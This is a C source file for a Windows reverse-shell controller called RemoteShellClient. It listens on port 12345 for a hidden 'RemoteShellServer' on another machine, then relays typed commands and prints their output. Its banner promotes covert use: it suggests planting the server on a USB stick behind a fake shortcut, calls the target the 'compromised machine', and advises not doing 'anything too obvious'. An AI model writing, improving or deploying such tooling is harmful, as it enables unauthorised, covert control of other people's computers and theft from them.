#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <Ws2tcpip.h> // Add this for inet_pton

#define CLIENT_PORT 12345 // Port where the laptop will listen for incoming connections
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#define PORT 12345
int main() {
    printf("\aRemoteShellClient by Arin Jander\nThis is the counterpart to RemoteShellServer, a remote connection disguised as whatever you want! Always start this program before the server, or have it running if you're using this to hack. Maybe you could hide RemoteShellServer on a USB stick, and have a fake shortcut that opens 'RemoteShellServer.exe \"Your-remote-controller's IP or adddress\"! You can use this for legal purposes too. Just remember its not encrypted! Your computer will beep when a connection is established.\n");
    WSADATA wsaData;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrLen = sizeof(clientAddr);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("WSAStartup failed");
        return 1;
    }

    // Create server socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        perror("Socket creation failed");
        WSACleanup();
        return 1;
    }

    // Configure server address (laptop's IP and port)
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(CLIENT_PORT);

    // Convert laptop's IP address from string to binary
    if (inet_pton(AF_INET, "0.0.0.0", &serverAddr.sin_addr) <= 0) {
        perror("Invalid IP address");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Bind server socket to the specified port
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Bind failed");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 1) == SOCKET_ERROR) {
        perror("Listen failed");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    printf("Waiting for the server to connect on port %d...\n", CLIENT_PORT);

    // Accept incoming connection from the server
    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET) {
        perror("Accept failed");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    printf("\aServer connected.\nYou have full control. Just dont do anything too obvious!\nIf your command has no response the compromised machine will echo the command. There is no active directory, so cd and things will not work. Use dir \"directory path\" to see files on the computer. Also return data is limited to 65535 bytes and your commands can be up to 8191 bytes long\n");

    char command[8192];
    char response[65536];

    while (1) {
        printf("Enter a command (or 'exit' to quit): ");
        fgets(command, sizeof(command), stdin);
        command[strlen(command) - 1] = '\0'; // Remove newline character

        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Send the command to the server
        send(clientSocket, command, strlen(command), 0);

        // Receive and print the response from the server
        memset(response, 0, sizeof(response));
        recv(clientSocket, response, sizeof(response), 0);
        printf("Server response:\n%s\n", response);
    }

    // Clean up and close sockets
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
